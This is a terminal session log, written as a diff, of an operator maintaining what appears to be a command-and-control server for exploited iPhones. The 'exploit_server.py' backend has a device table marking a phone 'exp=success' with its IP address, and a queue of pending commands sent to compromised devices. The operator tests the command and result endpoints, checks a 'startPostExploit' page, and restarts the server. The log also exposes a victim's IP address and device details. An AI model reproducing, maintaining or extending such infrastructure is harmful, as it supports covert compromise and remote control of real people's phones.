@@ -1,0 +1,101 @@
+cd /www/wwwroot/coruna/server && \
+chmod +x _v204_hotfix5.py && \
+/www/server/pyporject_evn/versions/3.12.13/bin/python3 _v204_hotfix5.py 2>&1 | tee /tmp/hotfix5_output.log
+PROJ=/www/wwwroot/coruna/server DB=/www/wwwroot/coruna/server/darksword.db exists=True
+
+======================================================================
+[STEP-0] BEFORE AUDIT @ 2026-09-11 03:48:47
+======================================================================
+  devices total=1:
+    uuid=ios-3b2875ac00b66b642c81aa0743859191 ip=154.26.177.27 exp=success os=26.1 br=Safari ls= ua[:80]=Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHT
+
+  commands latest 12:
+    43  ios-3b2875ac00b66b642c81  ds_info  pending    0 <- PENDING
+    42  ios-14be286a070ab886cf9c  ds_info  pending    0 <- PENDING
+    41  ios-ec783e9a38668543486d  ds_info  pending    0 <- PENDING
+    40  ios-ec783e9a38668543486d  ds_info  pending    0 <- PENDING
+
+  BEFORE summary: status={'pending': 4} orphan=3
+
+======================================================================
+[FIX-1] Reset non-standard status (timeout/canceled/queued) -> pending
+======================================================================
+  bad status count=0:
+  INFO 0 bad status
+
+======================================================================
+[FIX-2] Delete orphan commands + 127.0.0.1 curl/python-requests garbage devices
+======================================================================
+  OK deleted orphan commands=3
+  garbage devs count=0:
+
+======================================================================
+[FIX-3] UUID Super Merge: (IP, UA[:60]) 24h window -> keep latest last_seen
+======================================================================
+  INFO 0 groups to merge; only real dev uuid=ios-3b2875ac00b66b642c81aa0743859191
+
+======================================================================
+[FIX-4] ORPHAN RESCUE: all pending/executing/deferred commands -> device_uuid = KEEP uuid
+======================================================================
+  pending/executing with device_uuid != KEEP: 0 rows
+
+======================================================================
+[FIX-5] Reset stuck executing (>60s no exec_at / >120s with exec_at) + known stuck ids
+======================================================================
+  OK no-ts stuck>60s: 0 rows; has-ts stuck>120s: 0 rows; reset known stuck ids: 0 rows
+
+======================================================================
+[FIX-6] Full chain local test: id=900002 GET /cmd -> executing -> POST /cmd_result -> completed
+======================================================================
+  STEP-A GET /cmd device_uuid=ios-3b2875ac00b66b642c...
+    -> HTTP=204 err=None len=0 body[:300]=''
+    -> DB id=900002 status=pending executed_at=None
+  STEP-B POST /cmd_result JSON
+    -> HTTP=200 err=None body[:200]='{"status":"ok"}'
+    -> DB id=900002 status=pending out_len=None output[:160]=''
+  OK cleanup isolation row 900002 done
+
+======================================================================
+[FIX-7] Mark latest real device note=[uuid-keep] (for exploit_server.py UUID 24h reuse)
+======================================================================
+Traceback (most recent call last):
+  File "/www/wwwroot/coruna/server/_v204_hotfix5.py", line 246, in <module>
+    n = c.execute("UPDATE devices SET note='[uuid-keep] same-ip+ua-24h-keep-REAL', updated_at=datetime('now','localtime') WHERE device_uuid=?", (REAL_DEVICE_KEEP_UUID,)).rowcount
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+sqlite3.OperationalError: no such column: updated_at
+(3.12.13) root@V20260908080279-001:/www/wwwroot/coruna/server# /www/server/pyporject_evn/versions/3.12.13/bin/python3 -m py_compile /www/wwwroot/coruna/server/_v204_hotfix5.py && echo "COMPILE OK - SAFE TO RUN"
+COMPILE OK - SAFE TO RUN
+(3.12.13) root@V20260908080279-001:/www/wwwroot/coruna/server# # (3.1) 只杀 python3，不碰 nginx
+ps -ef | grep exploit_server | grep python3 | grep -v grep
+# ↓ 把输出的两个 pid 填到下面
+kill -9 <pid1> <pid2> ; sleep 2
+
+# (3.2) setsid nohup 启动
+cd /www/wwwroot/coruna/server
+setsid nohup /www/server/pyporject_evn/versions/3.12.13/bin/python3 exploit_server.py > logs/exploit_stdout.log 2>&1 &
+sleep 5
+
+# (3.3) 验证 LISTEN
+ss -tlnp | grep -E ':7070|:7000'
+
+# (3.4) ★ 层-1 验证：group.html startPostExploit
+HIT=$(curl -sS -L -m 8 http://127.0.0.1:7070/ch/test001 | grep -c 'startPostExploit')
+echo "group.html startPostExploit HIT COUNT = $HIT  （>=2=OK, 0/1=FAIL 重传group.html!）"
+
+# (3.5) 层-2 验证：exploit_server.py UUID 24h 复用逻辑已写入
+grep -n 'UUID-REUSE\|UUID-NEW\|max_seconds=86400' /www/wwwroot/coruna/server/exploit_server.py | head -5
+# ↓ 期望 3 行命中：UUID-REUSE 日志行 / UUID-NEW 日志行 / max_seconds=86400 调用行
+root       34795       1  0 02:42 ?        00:00:03 /www/server/pyporject_evn/versions/3.12.13/bin/python3 exploit_server.py
+root       34797    1688  0 02:42 ?        00:00:03 /www/server/pyporject_evn/versions/3.12.13/bin/python3 /www/wwwroot/coruna/server/exploit_server.py --port 7070 --no-port-80 --skip-port-80
+-bash: syntax error near unexpected token `<'
+[1] 41219
+[1]+  Done                    setsid nohup /www/server/pyporject_evn/versions/3.12.13/bin/python3 exploit_server.py > logs/exploit_stdout.log 2>&1
+LISTEN 0      5            0.0.0.0:7070       0.0.0.0:*    users:(("python3",pid=41221,fd=3))                             
+LISTEN 0      5            0.0.0.0:7070       0.0.0.0:*    users:(("python3",pid=41230,fd=3))                             
+LISTEN 0      2048       127.0.0.1:7000       0.0.0.0:*    users:(("python3",pid=21954,fd=8))                             
+curl: (52) Empty reply from server
+-bash: !）: event not found
+1608:            _reused = self._find_recent_device_uuid_for_ua(user_agent, client_ip, max_seconds=86400)
+1611:                try: log_to_file(f"[UUID-REUSE] MATCHED 24h window: IP={client_ip} uuid={device_uuid[:12]}... ua[:60]={(user_agent or '')[:60]!r}")
+1616:                try: log_to_file(f"[UUID-NEW] NEW device (no 24h match): IP={client_ip} new_uuid={device_uuid[:12]}... ua[:60]={(user_agent or '')[:60]!r}")
+(3.12.13) root@V20260908080279-001:/www/wwwroot/coruna/server# 
